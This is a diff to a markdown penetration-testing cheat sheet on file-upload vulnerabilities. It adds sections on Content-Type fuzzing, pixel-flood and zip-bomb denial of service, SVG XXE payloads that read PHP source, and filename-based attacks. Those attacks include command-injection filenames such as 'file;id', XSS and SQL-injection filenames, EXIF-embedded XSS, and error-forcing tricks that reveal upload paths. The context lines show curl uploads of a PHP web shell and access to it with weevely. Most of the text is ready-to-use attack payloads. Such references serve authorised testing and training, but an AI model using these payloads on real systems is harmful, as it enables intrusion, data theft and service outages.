@@ -20,11 +20,13 @@
 13. [ZIP / Archive Exploits](#13-zip--archive-exploits)
 14. [SVG Upload → XSS / XXE](#14-svg-upload--xss--xxe)
 15. [Server-Specific Bypass Techniques](#15-server-specific-bypass-techniques)
-16. [Finding the Upload Path](#16-finding-the-upload-path)
-17. [Post-Upload Escalation](#17-post-upload-escalation)
-18. [Automation & Wordlists](#18-automation--wordlists)
-19. [Master Checklist](#19-master-checklist)
-20. [External References](#20-external-references)
+16. [Filename-Based Attacks](#16-filename-based-attacks)
+17. [Upload Directory Disclosure](#17-upload-directory-disclosure)
+18. [Finding the Upload Path](#18-finding-the-upload-path)
+19. [Post-Upload Escalation](#19-post-upload-escalation)
+20. [Automation & Wordlists](#20-automation--wordlists)
+21. [Master Checklist](#21-master-checklist)
+22. [External References](#22-external-references)
 
 ---
 
@@ -179,6 +181,17 @@ Content-Type: application/octet-stream
 # curl with spoofed Content-Type
 curl -X POST http://target.com/upload \
   -F "file=@shell.php;type=image/jpeg"
+```
+
+> **Two Content-Type headers:** A multipart upload has TWO Content-Type headers — one for the full request (top) and one for the attached file (bottom). Usually change the file's Content-Type, but if the upload is sent as POST data, change the main one.
+
+### Fuzzing Allowed Content-Types
+
+```bash
+# Grab SecLists content-type wordlist and filter to images
+wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt
+cat web-all-content-types.txt | grep 'image/' > image-content-types.txt
+# Use with Burp Intruder to fuzz which Content-Types the server accepts
 ```
 
 ---
@@ -614,11 +627,28 @@ z.close()
 # If the server extracts to a directory, shell.php lands in webroot
 ```
 
-### Zip Bomb
+### Zip Bomb (Decompression Bomb)
 
 ```bash
 # Nested zip bomb (for DoS / WAF bypass testing)
 dd if=/dev/zero bs=1M count=1024 | zip bomb.zip -
+# Nested ZIPs within ZIPs can expand to petabytes
+```
+
+### Pixel Flood Attack (DoS)
+
+```
+# Create a small JPG/PNG (e.g. 500x500), then manually edit its compression
+# metadata to claim a size of 0xffff x 0xffff (4 Gigapixels).
+# When the server tries to render it, it allocates all memory → crash.
+```
+
+### ffmpeg AVI Upload → XXE
+
+```
+# If the server processes video uploads with ffmpeg, AVI files can be
+# crafted to trigger XXE via ffmpeg's subtitle/metadata parsing.
+# Search for public exploits: "AVI upload XXE ffmpeg"
 ```
 
 ### Symlink in ZIP
@@ -660,6 +690,20 @@ zip --symlinks evil.zip symlink.txt
   <text x="0" y="20">&xxe;</text>
 </svg>
 ```
+
+### SVG → XXE (Read PHP Source Code)
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+<svg>&xxe;</svg>
+```
+
+> Base64 decode the output to read PHP source. This reveals DB creds, more vulns, upload paths, and naming schemes.
+
+### XXE via Other Document Types
+
+PDF, Word (.docx), PowerPoint (.pptx) all contain XML internally. If a document viewer processes them and is vulnerable to XXE, you can modify the embedded XML to include XXE entities and perform blind XXE / SSRF against the backend.
 
 ### SVG → SSRF
 
@@ -746,7 +790,84 @@ Or for ASPX:
 
 ---
 
-## 16. Finding the Upload Path
+## 16. Filename-Based Attacks
+
+When the server uses the uploaded filename in OS commands, SQL queries, or displays it on the page — the filename itself becomes an injection vector.
+
+### Command Injection via Filename
+
+```bash
+# If the server runs: mv <filename> /uploads/
+# These filenames inject commands:
+file$(whoami).jpg
+file`whoami`.jpg
+file.jpg||whoami
+file.jpg;id
+```
+
+### XSS via Filename
+
+```
+# If the filename is reflected/displayed on a page:
+<script>alert(window.origin);</script>.jpg
+"><img src=1 onerror=alert(1)>.jpg
+```
+
+### SQLi via Filename
+
+```
+# If the filename is used in an SQL query unsafely:
+file';select+sleep(5);--.jpg
+```
+
+### XSS via Image Metadata
+
+```bash
+# Inject XSS into EXIF comment — triggers when metadata is displayed
+exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' image.jpg
+
+# Change MIME-Type to text/html — some apps render it as HTML instead of image
+```
+
+### XSS via HTML File Upload
+
+If the app allows `.html` uploads, upload a page with JavaScript — stored XSS for anyone who visits it.
+
+---
+
+## 17. Upload Directory Disclosure
+
+When you can't find where uploads go, force errors to leak the path.
+
+### Error Forcing Techniques
+
+```
+- Upload a file with a name that already exists → server may error with full path
+- Send two identical upload requests simultaneously → write conflict may leak path
+- Upload a file with an extremely long name (5000+ chars) → may cause path disclosure in error
+- Use LFI/XXE to read application source and find upload path
+- Fuzz for common upload directories (see section below)
+```
+
+### Windows-Specific Disclosure
+
+```
+# Upload with reserved characters (|, <, >, *, ?) → may cause error leaking path
+# Upload with Windows reserved names → server can't write, may reveal directory:
+CON
+COM1
+LPT1
+NUL
+PRN
+
+# Windows 8.3 short filename convention — can overwrite or reference existing files:
+# hackthebox.txt → HAC~1.TXT
+# web.conf → WEB~1.CON (could overwrite web.conf)
+```
+
+---
+
+## 18. Finding the Upload Path
 
 ```bash
 # Check response for path disclosure after upload
@@ -776,7 +897,7 @@ http://target.com/uploads/shell.php
 
 ---
 
-## 17. Post-Upload Escalation
+## 19. Post-Upload Escalation
 
 ### Trigger Execution
 
@@ -831,7 +952,7 @@ weevely http://target.com/uploads/shell.php password
 
 ---
 
-## 18. Automation & Wordlists
+## 20. Automation & Wordlists
 
 ### Extension Fuzzing with Burp Intruder
 
@@ -872,7 +993,7 @@ ffuf -u http://target.com/upload -X POST \
 
 ---
 
-## 19. Master Checklist
+## 21. Master Checklist
 
 ### Reconnaissance
 
@@ -922,6 +1043,22 @@ ffuf -u http://target.com/upload -X POST \
 - [ ] Check for ImageMagick processing → ImageTragick
 - [ ] Check for Nginx + PHP-FPM misconfiguration (`/uploads/image.jpg/.php`)
 
+### Filename-Based Attacks
+
+- [ ] Try command injection in filename (`file$(whoami).jpg`, `` file`whoami`.jpg ``)
+- [ ] Try XSS payload in filename (`<script>alert(1)</script>.jpg`)
+- [ ] Try SQLi in filename (`file';select+sleep(5);--.jpg`)
+- [ ] Try XSS via EXIF metadata (`exiftool -Comment='<img src=1 onerror=alert(1)>'`)
+- [ ] Try HTML file upload for stored XSS
+
+### Upload Directory Disclosure
+
+- [ ] Force errors by uploading duplicate filenames or simultaneous requests
+- [ ] Try overly long filenames (5000+ chars) to trigger error with path disclosure
+- [ ] On Windows: try reserved characters (`|`, `<`, `>`, `*`, `?`) in filename
+- [ ] On Windows: try reserved names (`CON`, `COM1`, `LPT1`, `NUL`) as filename
+- [ ] Try Windows 8.3 filename convention (`WEB~1.CON`) to overwrite files
+
 ### Post-Upload
 
 - [ ] Access the shell directly
@@ -931,7 +1068,7 @@ ffuf -u http://target.com/upload -X POST \
 
 ---
 
-## 20. External References
+## 22. External References
 
 - [PayloadsAllTheThings — Upload Insecure Files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
 - [HackTricks — File Upload](https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html)
